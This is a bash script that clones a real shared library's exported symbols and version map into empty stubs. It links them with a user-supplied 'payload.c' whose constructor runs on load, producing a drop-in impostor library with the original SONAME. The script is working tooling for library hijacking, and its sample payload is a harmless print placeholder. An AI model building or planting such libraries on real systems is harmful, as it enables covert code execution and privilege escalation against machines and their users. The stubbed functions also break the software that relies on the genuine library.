#!/bin/bash
# gen_lib.sh
# Usage: ./gen_lib.sh /lib/x86_64-linux-gnu/libgpg-error.so.0

REALLIB="$1"

if [ -z "$REALLIB" ]; then
  echo "Usage: $0 /path/to/libfoo.so.X"
  exit 1
fi

SONAME=$(readelf -d "$REALLIB" | grep SONAME | grep -oP '\[\K[^\]]+')
LIBBASE="${SONAME%%.*}"
OUTSO="$SONAME"
CFILE="${LIBBASE}_stubs.c"
MAPFILE="${LIBBASE}.map"
OBJFILE="${LIBBASE}.o"
PAYOBJ="payload.o"
PAYFILE="payload.c"
DYNLIST="${LIBBASE}.dynlist"

echo "[*] Library  : $REALLIB"
echo "[*] SONAME   : $SONAME"
echo "[*] Stubs    : $CFILE"
echo "[*] Payload  : $PAYFILE"
echo "[*] Map file : $MAPFILE"
echo "[*] Output   : $OUTSO"
echo ""

# --- Step 1: Check payload.c ---
if [ ! -f "$PAYFILE" ]; then
  echo "[!] $PAYFILE not found — generating sample..."
  cat > "$PAYFILE" << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

static void runmahpayload() __attribute__((constructor));

void runmahpayload() {
    printf("Testing Shared Library \n");
}
EOF
  echo "[*] Sample generated: $PAYFILE"
  echo "[*] Edit $PAYFILE then rerun: $0 $REALLIB"
  exit 0
fi

echo "[*] Found $PAYFILE — proceeding..."

# --- Step 2: Generate stubs ---
echo "[*] Extracting symbols from: $REALLIB"

{
  echo "/* Stubs for $SONAME */"
  echo "/* Auto-generated — do not edit */"
  echo ""

  nm -D --defined-only "$REALLIB" \
    | awk '$2 ~ /[TDBW]/ {print $3}' \
    | sort -u \
    | grep -v '^$' \
    | while IFS= read -r sym; do
        echo "__attribute__((visibility(\"default\"))) void ${sym}(void) {}"
      done
} > "$CFILE"

echo "[*] Generated $CFILE"

# --- Step 3: Extract version nodes ---
VERNODES=$(readelf -V "$REALLIB" 2>/dev/null \
  | grep -oP 'Name:\s+\K\S+' \
  | sort -u)

if [ -z "$VERNODES" ]; then
  VERNODES="${LIBBASE^^}_1"
  VERNODES="${VERNODES//-/_}"
  echo "[!] No version nodes found, using: $VERNODES"
fi

echo "[*] Version nodes: $VERNODES"

# --- Step 4: Extract symbols per version node ---
declare -A VERSYM

while IFS= read -r line; do
  sym=$(echo "$line"  | awk '{print $8}')
  [ -z "$sym" ] && continue
  ndx=$(echo "$line"  | awk '{print $7}')
  bind=$(echo "$line" | awk '{print $5}')
  type=$(echo "$line" | awk '{print $4}')
  [ "$ndx"  = "UND" ]     && continue
  [ "$bind" = "LOCAL" ]   && continue
  [ "$type" = "NOTYPE" ]  && continue
  [ "$type" = "SECTION" ] && continue
  [ "$type" = "FILE" ]    && continue

  if echo "$sym" | grep -q '@@'; then
    ver="${sym##*@@}"; sym="${sym%%@@*}"
  elif echo "$sym" | grep -q '@'; then
    ver="${sym##*@}";  sym="${sym%%@*}"
  else
    ver=$(echo "$VERNODES" | head -1)
  fi

  [ -z "$sym" ] && continue
  VERSYM[$ver]+="$sym "

done < <(readelf -sW "$REALLIB" 2>/dev/null | awk 'NF>=8')

ALL_SYMS=""
for ver in "${!VERSYM[@]}"; do
  ALL_SYMS+="${VERSYM[$ver]} "
done

# --- Step 5: Generate map ---
{
  FIRST=1
  PREV_NODE=""
  for ver in $(echo "$VERNODES" | tr ' ' '\n' | sort -V); do
    syms="${VERSYM[$ver]}"
    [ -z "$syms" ] && continue
    echo "${ver} {"
    echo "    global:"
    echo "$syms" | tr ' ' '\n' | sort -u | grep -v '^$' | while IFS= read -r s; do
      printf '        %s;\n' "$s"
    done
    echo "    local:"
    [ "$FIRST" -eq 1 ] && echo "        *;"
    [ -n "$PREV_NODE" ] && echo "} $PREV_NODE;" || echo "};"
    echo ""
    PREV_NODE="$ver"
    FIRST=0
  done
} > "$MAPFILE"

echo "[*] Generated $MAPFILE"

# --- Step 6: Compile ---
echo "[*] Compiling $PAYFILE..."
gcc -Wall -fPIC -c -o "$PAYOBJ" "$PAYFILE"
if [ $? -ne 0 ]; then echo "[!] Payload compile failed"; exit 1; fi

echo "[*] Compiling $CFILE..."
gcc -Wall -fPIC -c -o "$OBJFILE" "$CFILE"
if [ $? -ne 0 ]; then echo "[!] Stubs compile failed"; exit 1; fi

echo "[*] Linking..."
gcc -shared \
    -Wl,--version-script,"$MAPFILE" \
    -Wl,-soname,"$SONAME" \
    -o "$OUTSO" \
    "$PAYOBJ" "$OBJFILE"
if [ $? -ne 0 ]; then echo "[!] Link failed"; exit 1; fi

# --- Step 7: Verify ---
echo ""
echo "[*] Verification:"
EXPECTED=$(echo "$ALL_SYMS" | tr ' ' '\n' | sort -u | grep -v '^$' | wc -l)
ACTUAL=$(nm -D --defined-only "$OUTSO" | awk '$2~/[TDB]/{print $3}' | wc -l)
MISSING=$(comm -23 \
  <(echo "$ALL_SYMS" | tr ' ' '\n' | sort -u | grep -v '^$') \
  <(nm -D --defined-only "$OUTSO" | awk '$2~/[TDB]/{print $3}' | sort -u))

echo "    Expected : $EXPECTED"
echo "    Exported : $ACTUAL"

if [ -z "$MISSING" ]; then
  echo "    Status   : OK - all symbols present"
else
  echo "    Status   : MISSING — retrying with --dynamic-list..."
  {
    echo "{"
    echo "$ALL_SYMS" | tr ' ' '\n' | sort -u | grep -v '^$' | \
      while IFS= read -r s; do printf '  %s;\n' "$s"; done
    echo "};"
  } > "$DYNLIST"

  gcc -shared \
      -Wl,--dynamic-list,"$DYNLIST" \
      -Wl,-soname,"$SONAME" \
      -o "$OUTSO" \
      "$PAYOBJ" "$OBJFILE"

  echo "    Retried  : $DYNLIST"
fi

echo ""
echo "[*] Done: $OUTSO"
